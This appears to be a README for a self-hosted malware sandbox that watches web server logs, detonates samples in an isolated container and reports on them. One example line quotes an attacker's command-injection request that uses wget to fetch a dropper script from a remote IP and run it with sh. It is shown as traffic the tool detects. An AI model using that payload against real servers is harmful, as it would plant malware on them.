# Ninja Sandbox

**A free malware range that catches the sample at your front door and tells you what it does.**

Three things in one `docker compose up`:

| | What | How |
|---|---|---|
| **Raz0r Sensor** | watches your edge | reads Caddy / nginx / Apache / Traefik access logs on the host, over syslog from another host, or inline as a logging reverse proxy. Per-IP aggregates, probe families with CVE tags, the **dropper URLs** attackers try to make your server fetch, and **Adversary DNA** (18-dimension behavioural fingerprint, archetype, kill-chain stage, next-move prediction, same-operator clustering). |
| **The cell** | detonates the sample | a zero-capability runner (`--cap-drop ALL`, read-only root, 256 MiB, 64 pids, 60 s then SIGKILL) on an **internal Docker network with no way out**. A sinkhole answers every DNS question with itself, accepts every TCP/UDP connection, recovers the original destination, logs the first bytes, and writes a pcap. strace natively, QEMU's tracer for ARM/MIPS/x86-32. The host never executes the sample. No VM, no KVM needed. |
| **Reverse** | deep insight | static: ELF header/segments/sections, shared libs, imports, strings, IOCs, entropy, packer, credential tables. Dynamic: syscall timeline, process tree, files touched (persistence, defence evasion, recon), network, **C2 ranking**, protocol guess, ATT&CK technique hints with evidence, downloadable strace/sinkhole log/pcap. Deterministic verdict; optional AI write-up with **your own key**. |

Self-hosted by default: everything stays in `./data` on your box, telemetry is **off**, the UI binds to loopback.

## Quick start

```bash
git clone https://github.com/scottgardner777/ninja-sandbox && cd ninja-sandbox
cp .env.example .env                       # optional edits: log dir, sensor input, token
bash cell/build.sh                         # runner + sinkhole images (pulls alpine once; samples later run with no egress)
docker compose up -d --build
open http://127.0.0.1:8800                 # Detonate · Sensor · Reverse · Settings
```

Foreign-architecture samples (ARM, MIPS, x86-32) need qemu binfmt on the host, once:
`docker run --privileged --rm tonistiigi/binfmt --install all` then `bash cell/build.sh` again.

Try it: drop any Linux ELF on the Detonate tab. Or `curl -F file=@sample http://127.0.0.1:8800/api/sandbox/samples`.

## The in-situ path (sensor → sample → detonation)

1. The sensor sees `GET /shell?cd+/tmp;wget+http://45.1.2.3/jaws.sh;sh+jaws.sh` at your edge. The IP gets a probe family (`jaws-webserver`), the URL lands on the Sensor tab under **Droppers**.
2. **Load into sandbox** (or Settings → *fetch droppers* for hands-off): a throwaway `curl` container fetches it with a size cap. It is triaged in milliseconds.
3. **Detonate** (or Settings → *auto-detonate*): about 70 seconds later the Reverse tab shows what it did and who it called.
4. Files dropped into a **watch directory** (a honeypot's download folder, a quarantine) take the same path.

## Deep Scan

The Reverse tab has a **Deep Scan** console: a conversation with a frontier model over the full report (static, ELF, strings, IOCs, syscall timeline, processes, files, sinkhole hits with the first bytes sent, C2 ranking, ATT&CK). Ask what it is, what the trace proves, what to look at next in the pcap, or for YARA / Suricata rules built only from bytes that are in the report. Model `SANDBOX_DEEP_MODEL` (default `claude-fable-5-2`; `claude-mythos-5-2` for verified organisations; with `claude-opus-5-5` as the fallback when your organisation cannot use it); key = `ANTHROPIC_API_KEY` in `.env` or the BYOK Anthropic key. The transcript is stored beside the detonation as `<sha>.deepscan.json` and labelled model output; it never changes the deterministic verdict. `SANDBOX_DEEP_DAILY_CAP` (40) bounds the spend.

## Sensor inputs

| `SENSOR_INPUT` | Where the sensor runs | Proxy side |
|---|---|---|
| `file` | on the proxy host | `SENSOR_LOG_HOST=/var/log/nginx` in `.env`; `SENSOR_LOG_PATHS=/logs/access.log` |
| `syslog` | anywhere | Caddy: `log { output net udp/SENSOR:5514 format json }` · nginx: `access_log syslog:server=SENSOR:5514 combined;` · Apache: `CustomLog "\|/usr/bin/logger -n SENSOR -P 5514" combined` |
| `inline` | in front of one app | `SENSOR_UPSTREAM=http://app:3000`; point traffic at the sensor's `:8080` |
| API | anywhere | `POST /api/sandbox/sensor/ingest {"lines": [...], "format": "auto"}` |

Owner addresses go in `SENSOR_EXCLUDE` (never profiled, never sent). Cloudflare edge addresses and private ranges are dropped automatically; the real client IP is taken from `Cf-Connecting-Ip` / `X-Forwarded-For`.

## Modes

| Mode | Who runs it | Data | LLM |
|---|---|---|---|
| **self-hosted** | you | stays on your box; telemetry opt-in (the Settings tab shows the exact JSON that would be sent: per-IP aggregates and sample hashes/verdicts, never raw lines, never sample bytes unless you tick it) | none needed; BYOK (Anthropic, or any OpenAI-compatible local server) unlocks the write-up |
| **ninja-hosted** | Ninja Labz, multi-tenant | our lake, under our ToS; free tier 20 detonations/day, 7-day retention, 5k sensor IPs/day | ours |
| **hybrid** | sensor on your box, detonation at Ninja | sensor deltas to your dashboard and (opt-in) to us; samples to our cell | as above |

Ninja-hosted and hybrid are being switched on at ninjalabz.io; this repo is the self-hosted product and is complete on its own.

## API

`GET /api/docs` for the OpenAPI page. Everything the UI does is a route under `/api/sandbox/*`; with `SANDBOX_TOKEN` set, send `X-Sandbox-Token`.

## Isolation, honestly

Containers, not VMs. The runner has no capabilities, no writable root, a tmpfs, a pid and memory cap, the default seccomp and AppArmor profiles, and sits in a network namespace whose only route is the sinkhole on an internal network. That stops the sample talking out and limits what it can do to the kernel's syscall surface. A kernel exploit in the sample could still escape a container where it could not escape a VM. Run the sandbox on a box you can rebuild, not on your production host. The API container holds the Docker socket to spawn cells; treat access to the UI as root on that box.

## Legal

Apache-2.0. Samples you upload are yours; do not upload files containing personal data or a client's data you are not permitted to process. The cell never returns a live sample, only reports and traces. The sensor reads only your own logs. The dropper fetcher follows only URLs that attackers sent to your own edge, into an isolated container. Nothing here is legal advice; check your local rules on handling malware before you run a range.

## Development

```bash
pip install -r requirements.txt
pytest -q tests                            # no Docker needed: the cell is stubbed in tests
uvicorn sandbox.api:app --reload --port 8800
python -m sandbox.sensor.run               # the sensor loop (SENSOR_INPUT=file|syslog|inline)
```

Layout: `sandbox/` (config, triage, elf, cell, sinkhole, reverse, dna, explain, api, `sensor/`), `cell/` (image build), `ui/index.html`, `tests/`.

Built by the people who run the [Ninja honeynet](https://ninjalabz.io). The cell, the sensor and Adversary DNA are the same code we run on our own edge.
